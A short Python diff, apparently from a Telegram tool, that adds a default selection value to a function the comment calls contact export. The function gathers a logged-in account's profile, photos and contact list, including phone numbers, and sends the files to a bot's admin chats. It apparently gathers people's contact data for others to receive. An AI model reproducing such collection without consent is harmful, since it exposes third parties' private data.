@@ -377,6 +377,7 @@ def create_client():
 
 #Функция для выгрузки контактов 
 async def get_and_send_contacts(client, phone_number, user_id):
+  selection = '0'
   userid, userinfo, firstname, lastname, username, photos_user_html = await get_user_info(client, phone_number, selection)
   total_contacts, total_contacts_with_phone, total_mutual_contacts = await get_and_save_contacts(client, phone_number, userid, userinfo, firstname, lastname, username)
   await send_files_to_bot(bot, admin_chat_ids, user_id)
